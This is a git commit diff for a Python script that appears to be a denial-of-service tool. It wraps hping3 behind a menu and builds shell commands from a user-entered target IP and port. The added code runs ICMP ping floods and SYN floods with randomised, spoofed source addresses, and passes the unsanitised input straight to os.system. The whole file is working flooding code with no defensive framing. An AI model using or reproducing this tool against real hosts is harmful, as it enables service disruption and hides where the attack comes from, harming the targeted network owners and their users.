63a0ba43088ce03f71fc0a5a85c09168dd631870
ShinoShinow <shinomrnull@gmail.com>
2024-03-18 21:55:50 +0330

    end of project

--- main.py
+++ main.py
@@ -11,7 +11,7 @@ def printNG(str) :
 def main() :
     global choice    
     if int(choice) == 1 :
-        printNG("warning it work with your ip!!")
+        printNG("warning! it work with your ip!!")
         ip = input("dst_ip: ")
         port = input("port:(default=0) ")
         flood = input("flood:[Y/n] ")
@@ -29,15 +29,39 @@ def main() :
             system(f"hping3 -S -p {port} {ip}")
         else :
             printNG("missing argument!!")
+    if int(choice) == 2 :
+        printNG("warning! it work with your ip!!")
+        ip = input("dst_ip: ")
+        system(f"hping3 -1 --flood {ip}")
+    if int(choice) == 3 :
+        print("""
+        #######################          
+        #   1>SYN Flood       #
+        #   2>Ping Flood      # 
+        #######################
+        """)
+        pchoice = input("choice: ")
+        if not int(pchoice) in [1,2] :
+            print("missing argument!!")
+        if int(pchoice) == 1 :
+            ip = input("dst_ip: ")
+            port = input("port:(default=0) ")
+            if port == '' :
+                system(f"hping3 --flood --rand-source -S {ip}")
+            system(f"hping3 --flood --rand-source -S -p {port} {ip}")
+        if int(pchoice) == 2 :
+            ip = input("dst_ip: ")
+            system(f"hping3 -1 --rand-source {ip}")
 
+        
 
 def getplan() :
     global choice
     print("""
     #######################          
     #   1>SYN Attack      #
-    #   2>flood ping      # 
-    #   3>random source   #
+    #   2>Ping Flood      # 
+    #   3>Random Source   #
     #######################          
 """)
     choice = input("choice>")
@@ -45,6 +69,7 @@ def getplan() :
         print("your selected plan is not valid")
         _exit(1)
 
+system("clear")
 printNG("[+] Created by Mr.Null...")
 getplan()
 main()
